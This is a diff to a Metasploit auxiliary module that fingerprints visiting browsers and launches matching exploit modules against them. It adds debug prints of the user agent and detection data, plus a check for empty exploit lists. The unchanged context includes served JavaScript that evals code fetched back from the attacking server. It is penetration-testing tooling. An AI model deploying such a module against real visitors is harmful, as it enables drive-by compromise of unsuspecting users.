@@ -18,6 +18,7 @@
 #		- is a generic comparison possible?
 #			9.1 < 9.10 < 9.20b < 9.20
 #			3.5-pre < 3.5 < 3.5.1
+#	- 'Defanged' action that just prints out detection stuff
 
 require 'msf/core'
 require 'rex/exploitation/javascriptosdetect'
@@ -96,6 +97,10 @@ class Metasploit3 < Msf::Auxiliary
 			print_status("Found #{@exploits.length} exploit modules")
 		else 
 			start_exploit_modules()
+			if @exploits.length < 1
+				print_error("No exploits, check your MATCH and EXCLUDE settings")
+				return false
+			end
 			exploit()
 		end 
 	end
@@ -249,14 +254,14 @@ class Metasploit3 < Msf::Auxiliary
 				xhr = make_xhr();
 				xhr.onreadystatechange = function () {
 					if (xhr.readyState == 4 && (xhr.status == 200 || xhr.status == 304)) {
-						#{js_debug('"<pre>" + htmlentities(xhr.responseText) + "</pre>"')}
 						eval(xhr.responseText);
 					}
 				};
 
 				encoded_detection = new String();
+				#{js_debug('navigator.userAgent+"<br>"')}
 				for (var prop in detected_version) {
-					#{js_debug('prop + " " + detected_version[prop]')}
+					#{js_debug('prop + " " + detected_version[prop] +"<br>"')}
 					encoded_detection += detected_version[prop] + ":";
 				}
 				#{js_debug('encoded_detection + "<br>"')}
@@ -357,7 +362,7 @@ class Metasploit3 < Msf::Auxiliary
 			
 			cli.send_response(response)
 		else
-			print_error("I don't know how to handle this request (#{request.uri}), sending 404")
+			print_status("404ing #{request.uri}")
 			send_not_found(cli)
 			return false
 		end
@@ -551,7 +556,7 @@ class Metasploit3 < Msf::Auxiliary
 			# roughly the same as the javascript version on non-IE
 			# browsers because it does most everything with
 			# navigator.userAgent
-			print_status("Recording detection from User-Agent")
+			print_status("Recording detection from User-Agent: #{request['User-Agent']}")
 			report_user_agent(cli.peerhost, request)
 		else
 			data_offset += 'sessid='.length
@@ -582,7 +587,9 @@ class Metasploit3 < Msf::Auxiliary
 			end
 		end
 
-		# If the database is not connected, use a cache instead
+		# If the database is not connected, use a cache instead.
+		# This is less reliable because we're not treating different user
+		# agents from the same IP as a different hosts.
 		if (!get_client(cli.peerhost, request['User-Agent']))
 			print_status("No database, using targetcache instead")
 			@targetcache ||= {}
